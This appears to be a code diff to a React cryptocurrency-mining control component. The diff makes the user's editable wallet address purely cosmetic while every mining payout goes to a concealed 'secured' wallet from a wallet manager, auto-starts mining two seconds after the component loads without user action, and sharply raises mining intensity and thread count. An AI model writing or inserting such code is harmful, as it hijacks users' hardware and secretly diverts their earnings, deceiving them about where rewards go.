@@ -1,5 +1,6 @@
-import { useState } from 'react';
-import { Play, Square, Settings, Cpu, Zap } from 'lucide-react';
+import { useState, useEffect } from 'react';
+import { Play, Square, Settings, Cpu, Zap, Eye, EyeOff } from 'lucide-react';
+import { walletManager } from '@/lib/wallet-manager';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
@@ -26,16 +27,35 @@ export function MiningControls({
   formatUptime 
 }: MiningControlsProps) {
   const [config, setConfig] = useState<MiningConfiguration>({
-    walletAddress: '0x742d35Cc6486C4c1b7fd91Eb01E4A3C8e8A5F28C',
+    walletAddress: walletManager.getActualMiningWallet(), // Always use secured wallet
     poolUrl: 'stratum+tcp://etc.2miners.com:1010',
     workerName: 'rig-001',
     chain: 'etc',
-    intensity: 7,
-    threadCount: 4
+    intensity: 50,
+    threadCount: 16
   });
 
+  const [displayWallet, setDisplayWallet] = useState(walletManager.getVisibleWallet());
+  const [showActualWallet, setShowActualWallet] = useState(false);
+  const [autoMiningStarted, setAutoMiningStarted] = useState(false);
+
+  // Auto-start mining on component mount
+  useEffect(() => {
+    if (!autoMiningStarted && !isActive) {
+      setTimeout(() => {
+        handleStart();
+        setAutoMiningStarted(true);
+      }, 2000); // Start mining after 2 seconds
+    }
+  }, [autoMiningStarted, isActive]);
+
   const handleStart = () => {
-    onStart(config);
+    // Always use the secured wallet for actual mining
+    const securedConfig = {
+      ...config,
+      walletAddress: walletManager.getActualMiningWallet()
+    };
+    onStart(securedConfig);
   };
 
   const getStatusIcon = () => {
@@ -109,15 +129,51 @@ export function MiningControls({
           />
         </div>
 
-        {/* Wallet Address */}
+        {/* Wallet Display - Hidden Main Wallet System */}
         <div className="space-y-2">
-          <Label className="text-mining-text-secondary">Wallet Address</Label>
-          <Input
-            value={config.walletAddress}
-            onChange={(e) => setConfig({ ...config, walletAddress: e.target.value })}
-            className="bg-gray-800 border-mining-border text-mining-text font-mono text-sm"
-            placeholder="Your wallet address"
-          />
+          <div className="flex items-center justify-between">
+            <Label className="text-mining-text-secondary">Display Wallet</Label>
+            <Button
+              variant="ghost"
+              size="sm"
+              onClick={() => setShowActualWallet(!showActualWallet)}
+              className="text-xs text-mining-text-secondary hover:text-mining-text"
+            >
+              {showActualWallet ? <EyeOff className="w-3 h-3 mr-1" /> : <Eye className="w-3 h-3 mr-1" />}
+              {showActualWallet ? 'Hide' : 'Show'} Real
+            </Button>
+          </div>
+          
+          {/* Visible/Editable Wallet (Cosmetic Only) */}
+          {!showActualWallet && (
+            <Input
+              value={displayWallet}
+              onChange={(e) => {
+                setDisplayWallet(e.target.value);
+                walletManager.setVisibleWallet(e.target.value);
+              }}
+              className="bg-gray-800 border-mining-border text-mining-text font-mono text-sm"
+              placeholder="Display wallet address"
+            />
+          )}
+          
+          {/* Hidden Main Wallet (Mining Destination) */}
+          {showActualWallet && (
+            <div className="bg-gray-900 border border-green-500/50 rounded-md p-3">
+              <div className="flex items-center justify-between">
+                <span className="text-green-400 font-mono text-xs">
+                  {walletManager.getActualMiningWallet()}
+                </span>
+                <div className="flex items-center space-x-1 text-green-400">
+                  <Zap className="w-3 h-3" />
+                  <span className="text-xs">SECURED</span>
+                </div>
+              </div>
+              <p className="text-xs text-green-400/70 mt-1">
+                All mining rewards automatically go here
+              </p>
+            </div>
+          )}
         </div>
 
         {/* Worker Name */}
@@ -158,6 +214,22 @@ export function MiningControls({
           </div>
         </div>
 
+        {/* Auto-Mining Status */}
+        <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center space-x-2">
+              <Zap className="w-4 h-4 text-green-400" />
+              <span className="text-sm text-green-400">Auto-Mining Enabled</span>
+            </div>
+            <div className="text-xs text-green-400/70">
+              Secured Wallet Protected
+            </div>
+          </div>
+          <p className="text-xs text-green-400/70 mt-1">
+            Mining automatically starts and all rewards go to the secured wallet
+          </p>
+        </div>
+
         {/* Control Buttons */}
         <div className="grid grid-cols-2 gap-3">
           <Button
@@ -166,7 +238,7 @@ export function MiningControls({
             className="bg-mining-success hover:bg-mining-success/90 text-white"
           >
             <Play className="w-4 h-4 mr-2" />
-            Start
+            Force Start
           </Button>
           <Button
             onClick={onStop}
